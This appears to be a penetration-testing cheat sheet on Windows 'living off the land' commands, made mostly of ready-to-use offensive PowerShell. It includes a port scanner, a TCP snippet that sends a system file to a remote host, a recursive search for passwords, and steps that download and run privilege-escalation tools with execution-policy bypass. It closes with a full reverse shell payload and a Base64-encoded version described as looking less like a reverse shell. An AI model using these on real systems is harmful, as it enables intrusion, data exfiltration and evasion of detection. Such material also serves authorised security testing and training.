---
description: >-
  Using Windows programs to perform all kinds of actions, without requiring
  extra software
---

# Living Off The Land (LOLBAS)

{% embed url="https://lolbas-project.github.io/" %}
A list of **builtin** Windows binaries and commands that can _download_, _execute_ and do other interesting things
{% endembed %}

## Windows actions

Some common commands you'll find yourself using in many situations. When a Windows machine is compromised you must sometimes live with the binaries that it has, so these code snippets contain the Windows-equivalent to some Linux utilities:

<pre class="language-powershell" data-title="nc -v $IP $PORT"><code class="lang-powershell"><strong>Test-NetConnection -Port 22 10.10.10.10
</strong></code></pre>

<pre class="language-powershell" data-title="nmap -p $PORTS $IP" data-overflow="wrap"><code class="lang-powershell"><strong>1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null
</strong></code></pre>

&#x20;<mark style="color:blue;">**↳**</mark> The above loop is **very slow** because it goes through ports one by one with a timeout

<pre class="language-powershell" data-title="SMB: List shares on dc01"><code class="lang-powershell"><strong>net view \\dc01 /all
</strong></code></pre>

<pre class="language-powershell" data-title="Interactive netcat"><code class="lang-powershell">dism /online /Enable-Feature /FeatureName:TelnetClient

<strong>telnet 10.10.10.10 25  # SMTP
</strong></code></pre>

&#x20;<mark style="color:blue;">**↳**</mark> This feature needs to be already enabled, or enabled by you as an administrator

{% code title="wget $URL -O $FILE" %}
```powershell
iwr http://10.10.10.10/file.txt -o file.txt
```
{% endcode %}

<pre class="language-powershell" data-title="nc $IP $PORT < $FILE"><code class="lang-powershell">$client = New-Object System.Net.Sockets.TcpClient
<strong>$client.Connect("10.10.10.10", 1337)
</strong>$writer = New-Object System.IO.StreamWriter($client.GetStream())
<strong>$bytes = (Get-Content -Encoding byte "C:\Windows\win.ini")
</strong>$writer.BaseStream.Write($bytes, 0, $bytes.Length)
$writer.Flush()
</code></pre>

{% code title="sudo" %}
```powershell
runas /user:j0r1an powershell  # local
runas /user:corp\j0r1an powershell  # domain
```
{% endcode %}

<pre class="language-powershell" data-title="find"><code class="lang-powershell"><strong>Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue
</strong></code></pre>

<pre class="language-powershell" data-title="grep -ri $PATTERN"><code class="lang-powershell"><strong>dir -Recurse | Select-String -Pattern "password"
</strong></code></pre>

<pre class="language-powershell" data-title="history" data-overflow="wrap"><code class="lang-powershell"><strong>Get-History
</strong># Raw method below can bypass Clear-History
<strong>type (Get-PSReadlineOption).HistorySavePath
</strong># Get verbose script block events (may be large)
<strong>Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[EventID=4104]]" | Export-Csv -Path 'ScriptBlockEvents.csv' -NoTypeInformation
</strong></code></pre>

<pre class="language-powershell" data-title="./linpeas.sh" data-overflow="wrap" data-full-width="false"><code class="lang-powershell"><strong>iwr https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEAS.exe; .\winPEAS.exe | Tee-Object winPEAS.txt
</strong>
# Another quick tool is PowerUp.ps1, containing some auto-exploitable functions
<strong>iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
</strong><strong>powershell -ep bypass
</strong><strong>. .\PowerUp.ps1
</strong><strong>Invoke-PrivescAudit
</strong></code></pre>

<pre class="language-powershell" data-title="Get ACEs from username" data-overflow="wrap"><code class="lang-powershell">Import-Module .\PowerView.ps1
<strong>$sid = (get-domainuser j0r1an).objectsid
</strong><strong>Get-ObjectACL | ? {$_.SecurityIdentifier -eq $sid} | select ObjectDN,ActiveDirectoryRights
</strong></code></pre>

### Powershell Reverse Shell

A reverse shell sends a connection back to an attacker, from which they can execute commands on the target interactively. In PowerShell, this can be done by creating a TCP socket, receiving a command, and then sending back the output.&#x20;

A short implementation of this is [revshells.com - PowerShell #3 (Base64)](https://www.revshells.com/). It uses the following payload and replaces the `$IP` and `$PORT` with your server:

{% code title="Payload" overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

[This CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Encode\_text\('UTF-16LE%20\(1200\)'\)To\_Base64\('A-Za-z0-9%2B/%3D'\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'powershell%20-e%20$%26',false,false,false,true\)) can be used to convert the above command into an encoded payload, looking way less like a reverse shell and containing fewer special characters:

{% code title="Encoded Payload" %}
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAJABJAFAAIgAsACQAUABPAFIAVAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
{% endcode %}
